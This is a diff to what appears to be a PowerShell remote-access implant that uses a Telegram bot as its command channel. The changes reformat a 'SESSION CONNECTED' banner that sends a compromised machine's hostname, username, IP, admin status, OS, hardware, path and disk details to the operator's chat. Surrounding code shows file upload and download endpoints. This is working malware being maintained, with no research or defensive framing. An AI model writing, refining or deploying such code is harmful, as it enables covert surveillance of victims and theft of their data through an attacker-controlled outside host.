@@ -17,13 +17,14 @@ $api_file_dl   = "https://api.telegram.org/file/bot$api_token/"
 $api_upload    = "$api_base/sendDocument?chat_id=$telegram_id"
 
 
+function EscapeMd($s) { $s -replace '([_*\[\]()~`>#+\-=|{}.!\\])', '\$1' }
+
 function SendRaw($text) {
-    $escaped = $text -replace "([$([regex]::Escape('_*``[\'))])", "\`$1"
     $body = @{
         chat_id    = $telegram_id
         parse_mode = "MarkdownV2"
-        text       = "``````$escaped``````"
-    } | ConvertTo-Json
+        text       = $text
+    } | ConvertTo-Json -Depth 5
 
     try { Invoke-RestMethod -Method Post -Uri $api_send -Body $body -ContentType "application/json; charset=utf-8" -WebSession $session | Out-Null }
     catch { Start-Sleep -Seconds 3 }
@@ -92,28 +93,26 @@ function SendConnectBanner {
     $disks      = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -ne $null } | ForEach-Object {
         $free  = [math]::Round($_.Free / 1GB, 1)
         $total = [math]::Round(($_.Used + $_.Free) / 1GB, 1)
-        "  $($_.Name):\ $free GB free / $total GB"
+        "*$($_.Name):\\* $(EscapeMd "$free GB free / $total GB")"
     }
 
-    $banner = @"
-+----------------------------------+
-|        SESSION CONNECTED         |
-+----------------------------------+
-  HOST    : $session_id
-  USER    : $env:USERNAME
-  IP      : $ip
-  ADMIN   : $admin
-  OS      : $($os.Caption)
-  CPU     : $cpu
-  RAM     : $ram_used GB / $ram_total GB used
-  UPTIME  : $uptime_str
-  PATH    : $((Get-Location).Path)
-+----------------------------------+
-  DISKS:
-$($disks -join "`n")
-+----------------------------------+
-"@
-    SendRaw $banner
+    $lines = @(
+        "*SESSION CONNECTED*"
+        ""
+        "*Host* `u{00B7} $(EscapeMd $session_id)"
+        "*User* `u{00B7} $(EscapeMd $env:USERNAME)"
+        "*IP* `u{00B7} $(EscapeMd $ip)"
+        "*Admin* `u{00B7} $admin"
+        "*OS* `u{00B7} $(EscapeMd $os.Caption)"
+        "*CPU* `u{00B7} $(EscapeMd $cpu)"
+        "*RAM* `u{00B7} $(EscapeMd "$ram_used GB / $ram_total GB")"
+        "*Uptime* `u{00B7} $(EscapeMd $uptime_str)"
+        "*Path* `u{00B7} $(EscapeMd ((Get-Location).Path))"
+        ""
+        "*Disks*"
+    ) + $disks
+
+    SendRaw ($lines -join "`n")
 }
 
 function DownloadFile($file_id, $file_name) {
